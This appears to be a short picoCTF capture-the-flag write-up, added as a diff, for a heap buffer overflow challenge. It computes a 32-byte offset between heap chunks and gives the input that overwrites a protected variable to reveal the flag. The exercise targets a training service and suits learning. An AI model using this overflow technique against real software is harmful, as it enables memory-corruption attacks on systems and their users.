@@ -1,0 +1,34 @@
+
+cnnect to the server --> nc tethys.picoctf.net 57815
+
+Heap State:
++-------------+----------------+
+[*] Address   ->   Heap Data
++-------------+----------------+
+[*]   0x6402463452b0  ->   pico
++-------------+----------------+
+[*]   0x6402463452d0  ->   bico
++-------------+----------------+
+
+Options:
+1. Print Heap:          (print the current state of the heap)
+2. Write to buffer:     (write to your own personal block of data on the heap)
+3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
+4. Print Flag:          (Try to print the flag, good luck)
+5. Exit
+
+we need a offset to bypass the safe_var
+
+offset = bico(data) - pico(data)
+offset = 0x6402463452d0 - 0x6402463452b0
+offset = 32
+
+we need input as offset which contains 32 characters of data
+
+offset = abcdefghijklmnopqrstuvwxyz012345 --> a-z=26, 0-5=6
+
+connect to the server --> write offset to buffer -->  print safe_var --> print flag
+
+boom !!! flag found !!!
+
+
